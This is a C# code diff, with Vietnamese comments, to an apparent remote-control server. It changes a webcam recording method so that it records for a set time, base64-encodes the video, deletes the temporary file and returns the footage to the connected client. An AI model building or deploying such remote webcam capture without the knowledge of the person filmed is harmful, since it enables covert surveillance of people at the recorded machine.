@@ -496,35 +496,35 @@ namespace Server
         {
             VideoCaptureDevice videoSource = null;
             VideoFileWriter writer = null;
+            bool recording = false;
+            bool opened = false;
+            string base64Result = "";
 
             try
             {
+                // Lấy webcam đầu tiên
                 var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                 if (devices.Count == 0)
                     return "LOG: Không tìm thấy webcam!";
 
-                // 🔥 Tự tạo file lưu (KHÔNG DÙNG SaveFileDialog)
-                string savePath = Path.Combine(
-                    Path.GetTempPath(),
-                    "record_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".avi"
-                );
-
                 videoSource = new VideoCaptureDevice(devices[0].MonikerString);
 
+                // Chọn độ phân giải tốt nhất
                 VideoCapabilities best = videoSource.VideoCapabilities
                     .OrderByDescending(v => v.FrameSize.Width * v.FrameSize.Height)
                     .First();
-
                 videoSource.VideoResolution = best;
 
                 writer = new VideoFileWriter();
-                bool opened = false;
-                bool recording = true;
-                DateTime start = DateTime.Now;
+                recording = true;
 
-                AForge.Video.NewFrameEventHandler handler = null;
+                // Temp file lưu video
+                string savePath = Path.Combine(Path.GetTempPath(), "rec_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".avi");
 
-                handler = (s, e) =>
+                DateTime startTime = DateTime.Now;
+
+                // Event handler
+                videoSource.NewFrame += (s, e) =>
                 {
                     if (!recording) return;
 
@@ -532,51 +532,66 @@ namespace Server
 
                     if (!opened)
                     {
-                        writer.Open(
-                            savePath,
-                            best.FrameSize.Width,
-                            best.FrameSize.Height,
-                            30,
-                            VideoCodec.MPEG4
-                        );
+                        int w = frame.Width; int h = frame.Height;
+                        if (w % 2 != 0) w--; if (h % 2 != 0) h--; // frame size chẵn
+                        writer.Open(savePath, w, h, 30, VideoCodec.MPEG4);
                         opened = true;
                     }
 
-                    var ts = DateTime.Now - start;
-                    writer.WriteVideoFrame(frame, ts);
-                    frame.Dispose();
+                    try
+                    {
+                        var timestamp = DateTime.Now - startTime;
+                        writer.WriteVideoFrame(frame, timestamp);
+                    }
+                    catch
+                    {
+                        // ignore encoding error
+                    }
+                    finally
+                    {
+                        frame.Dispose();
+                    }
                 };
 
-                videoSource.NewFrame += handler;
                 videoSource.Start();
 
-                Thread.Sleep(seconds * 1000);
+                Thread.Sleep(seconds * 1000); // quay xong
 
-                // Stop
                 recording = false;
-                videoSource.NewFrame -= handler;
+                videoSource.SignalToStop();
+                videoSource.WaitForStop();
 
-                if (videoSource.IsRunning)
+                if (opened)
                 {
-                    videoSource.SignalToStop();
-                    videoSource.WaitForStop();
+                    writer.Close();
+                    writer.Dispose();
                 }
 
-                if (opened) writer.Close();
-                writer?.Dispose();
-                videoSource = null;
-                writer = null;
+                // Convert video thành base64
+                if (File.Exists(savePath))
+                {
+                    byte[] bytes = File.ReadAllBytes(savePath);
+                    base64Result = Convert.ToBase64String(bytes);
+                    try { File.Delete(savePath); } catch { }
+                }
 
-                GC.Collect();
-                GC.WaitForPendingFinalizers();
-
-                return "LOG: Video đã lưu tại " + savePath;
+                return "VID|" + base64Result;
             }
             catch (Exception ex)
             {
                 return "LOG: Lỗi quay webcam: " + ex.Message;
             }
+            finally
+            {
+                try { videoSource?.SignalToStop(); videoSource?.WaitForStop(); } catch { }
+                try { writer?.Close(); writer?.Dispose(); } catch { }
+                videoSource = null;
+                writer = null;
+                GC.Collect();
+                GC.WaitForPendingFinalizers();
+            }
         }
+
         public async Task DisconnectServer()
         {
             try
